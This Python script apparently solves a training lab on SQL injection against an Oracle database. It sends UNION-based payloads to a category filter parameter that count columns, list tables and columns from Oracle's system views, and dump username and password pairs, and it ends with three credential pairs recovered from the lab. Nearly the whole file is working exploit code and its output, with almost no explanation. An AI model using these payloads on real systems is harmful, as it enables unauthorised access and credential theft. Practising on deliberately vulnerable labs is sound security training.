
import requests as r
from time import sleep


# lab name: SQL injection attack, listing the database contents on Oracle
link = "" # without the last backslash
vuln_path = "/filter?category=Pets"



# when we enumerate an oracle DB we need to give a valid table name like   'v$version' 
# it's a specificity of oracle DB

def found_columns():
    
    col = 0
    response ="Error"
    payload="\' union select "
    while "Error" in  response : 
        if col == 0:
            payload += "null"
        else:
            payload+=",null"
        finalLink = link+vuln_path+payload + " from v$version -- "  
        col+=1
        my_req = r.get(finalLink)
        response = my_req.text
        print(finalLink)
        
        sleep(0.4)

    print("Found {} columns".format(col))
    return col




#number_col = found_columns()  # returns 2 columns




def dump_table():
    payload = "\' union select null,table_name from all_tables --"
    send_payload = link + vuln_path + payload 
    my_request = r.get(send_payload)
    response = my_request.text 
    print(response)


# dump_table()

# we found an interesting table called : USERS_UHAPIV

def dump_columns(found_table_name):
    payload = "\' union select null,column_name from all_tab_columns where table_name=\'" +  found_table_name + "\'  -- "
    send_payload = link + vuln_path + payload 
    my_request = r.get(send_payload)
    response = my_request.text 
    print(response)


#dump_columns("USERS_UHAPIV")

# we found two columns : 
# PASSWORD_RHAURL
# USERNAME_FBQGXP


def dump_user_password(col1,col2,table_name):
    payload = "\' union select null," + col1 +  " || \'-\' || "+ col2  +  " from  "+  table_name  +  " -- "
    send_payload = link + vuln_path + payload 
    my_request = r.get(send_payload)
    response = my_request.text 
    print(response)

dump_user_password("USERNAME_FBQGXP", "PASSWORD_RHAURL","USERS_UHAPIV")


#administrator-df52pi4c2jl735rnufhr
#carlos-1rhg6gg2fzpxe1tt1wcp
#wiener-i5hi4lk3xds3jd7sm9f4